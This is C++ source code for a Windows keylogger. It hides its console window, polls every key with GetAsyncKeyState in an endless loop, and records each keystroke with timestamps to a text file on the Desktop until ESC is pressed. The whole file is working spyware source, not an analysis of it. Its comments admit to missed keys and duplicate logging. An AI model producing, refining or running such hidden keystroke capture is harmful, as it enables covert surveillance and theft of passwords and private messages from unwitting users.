#include <windows.h>
#include <fstream>

#include <iostream>
 
#include <chrono>
#include <ctime>


int main() {
    // Hide the console window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Open log file using ofstream class 
  //  std::ofstream logfile("C:\\Users\\hp\\Desktop\\keys.txt", std::ios::app);
    
    std::ofstream logfile("C:\\Users\\hp\\Desktop\\keys.txt", std::ios::out);
 
    

    if (logfile.is_open()) {
        std::time_t now = std::time(nullptr);
        char buf[100];
        std::strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", std::localtime(&now));

        logfile << "Started at: " << buf << std::endl;
    }



    boolean keyPressed[255] = { false };
    // Infinite loop to check key states
    while (true) {
        //check the whole keys ( some i dont detect them ) 
        for (int key = 1; key <= 254; key++) {
            // Check if key is pressed
            if (GetAsyncKeyState(key) & 0x8000) {
                if (keyPressed[key] == false) { //not pressed 
                    keyPressed[key] = true; //mark it as pressed 

                    if (key == VK_ESCAPE) {
                       
                        std::time_t now = std::time(nullptr);
                        char buf[100];
                        std::strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", std::localtime(&now));

                        logfile << "[ESC] at : "<<buf<<std::endl;
                        logfile.close();
                        return 0;  // Stop on ESC
                    }

                    //nums from 0 to 9
                    if (key >= '0' && key <= '9')
                        logfile << char(key) << "\n"; //convert from int to asci ( char ) 


                    //chars from A to Z
                    if (key >= 'A' && key <= 'Z')
                        logfile << char(key) << "\n"; //convert from int to asci ( char ) 


                    //nums on keypad
                    if (key >= VK_NUMPAD0 && key <= VK_NUMPAD9)
                        logfile << "[Keypad " << key - 96 << " ]" << "\n";




                    //other keys which are not chars 
                    switch (key) {

                    case VK_TAB: logfile << "[TAB]" << "\n"; break;
                    case VK_CAPITAL:logfile << "[Caps Lock]" << "\n"; break; //caps lock key
                    case VK_LSHIFT:logfile << "[Left Shift]" << "\n"; break;
                    case VK_RSHIFT: logfile << "[Right Shift]" << "\n"; break;
                    case VK_LCONTROL: logfile << "[Left Ctrl]" << "\n"; break;//ctrl left
                    case VK_RCONTROL: logfile << "[Right Ctrl]" << "\n"; break; //ctrl right 
                    case VK_LMENU:logfile << "[Left Alt]" << "\n"; break;//left alt 
                    case VK_RMENU:logfile << "[Right Alt]" << "\n"; break;//right alt
                    case VK_SPACE:logfile << "[Space]" << "\n"; break;
                    case VK_RETURN: logfile << "[Enter]" << "\n"; break; //enter
                    case VK_LWIN:logfile << "[Left Window Logo]" << "\n"; break;//left windows logo
                    case VK_RWIN:logfile << "[Right window Logo]" << "\n"; break;//right windows logo 
                    case VK_BACK:logfile << "[Backspace]" << "\n"; break;//backspace 
                    case VK_LEFT: logfile << "[Left Arrow]" << "\n"; break;//left arrow
                    case VK_RIGHT:logfile << "[Right Arrow]" << "\n"; break;//right arrow
                    case VK_UP:logfile << "[Up Arrow]" << "\n"; break;//up arrow
                    case VK_DOWN: logfile << "[Down Arrow]" << "\n"; break;//down arrow
                    case VK_HOME: logfile << "[Home]" << "\n"; break;//home
                    case VK_END:logfile << "[End]" << "\n"; break;//end
                    case VK_PRIOR:logfile << "[Page Up]" << "\n"; break;//page up
                    case VK_NEXT:logfile << "[Page Down]" << "\n"; break;//page down
                    case VK_MULTIPLY:logfile << "[* Keypad]" << "\n"; break;//* keypad
                    case VK_ADD:logfile << "[+ Keypad]" << "\n"; break;//+ keypad
                    case VK_SUBTRACT:logfile << "[- Keypad]" << "\n"; break; // - keypad
                    case VK_DECIMAL:logfile << "[. Keypad]" << "\n"; break;// . keypad
                    case VK_DIVIDE: logfile << "[/ Keypad]" << "\n"; break; // / keypad
                    case VK_VOLUME_MUTE:logfile << "[Volume Mute]" << "\n"; break;
                    case VK_VOLUME_DOWN:logfile << "[Volume Down]" << "\n"; break;
                    case VK_VOLUME_UP:logfile << "[Volume Up]" << "\n"; break;
                    case VK_MEDIA_NEXT_TRACK:logfile << "[Volume Next Track]" << "\n"; break;
                    case VK_MEDIA_PREV_TRACK:logfile << "[Volume Previous Track]" << "\n"; break;
                    case VK_DELETE:logfile << "[Delete]" << "\n"; break;
                    case VK_SNAPSHOT:logfile << "[Print Screen Shot]" << "\n"; break;//print screen ( screen shot ) 

                    /*these theye are not detectable in my keyboard since it is not US one !!
                    case VK_OEM_COMMA:logfile << "[,]" << "\n"; break;
                    case VK_OEM_PERIOD:logfile << "[.]" << "\n"; break;
                    case VK_OEM_1:logfile << "[;]" << "\n"; break;
                    case VK_OEM_7:logfile << "[']" << "\n"; break;
                    case VK_OEM_2:logfile << "[/]" << "\n"; break;
                    case VK_OEM_3:logfile << "[`]" << "\n"; break;
                    case VK_OEM_4:logfile << "[[]" << "\n"; break;
                    case VK_OEM_6:logfile << "[]]" << "\n"; break;*/

                    case VK_OEM_PLUS:logfile << "[=]" << "\n"; break;//yes it is = not + since it depends on the region 
                    case VK_OEM_MINUS:logfile << "[-]" << "\n"; break;
                    case VK_NUMLOCK:logfile << "[NumLock]" << "\n"; break;

                    }

                    logfile.flush();
                    Sleep(120);

                }
            }
            
            keyPressed[key] = false;
        }
        //after each key hit to avoid CPU overhead
        Sleep(10);  // Lower CPU usage
    }

    return 0;
}
//fn key is not detectable 
//in some cases may we have some keys to logged twice or even more this related to debouncing issue 